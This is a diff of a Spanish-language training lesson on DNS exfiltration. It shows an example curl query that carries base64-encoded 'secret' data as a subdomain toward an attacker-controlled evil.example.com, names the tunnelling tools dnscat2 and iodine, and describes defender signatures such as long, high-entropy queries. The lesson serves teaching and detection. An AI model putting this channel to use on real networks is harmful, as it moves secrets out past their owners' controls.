@@ -31,7 +31,10 @@ curl -s "http://127.0.0.1:18103/dns?q=c3VwZXJzZWNyZXRkYXRhZXhmaWx0cmF0ZWQ.exampl
 El servidor DNS autoritativo de `evil.example.com` (controlado por el
 atacante) ve la "consulta" y decodifica el subdominio: los datos ya
 salieron de la red. Herramientas reales: `dnscat2`, `iodine`, y el
-propio `nslookup` a mano.
+propio `nslookup` a mano. El siguiente room del módulo (*Exfiltración de
+datos: el canal DNS*) lleva este canal al límite —trocear, codificar y
+reensamblar un secreto completo—; aquí nos quedamos con lo que el
+defensor necesita para correlar.
 
 La firma del defensor: **consultas anormalmente largas** (los
 subdominios legítimos rara vez pasan de 25-30 chars), alta entropía del
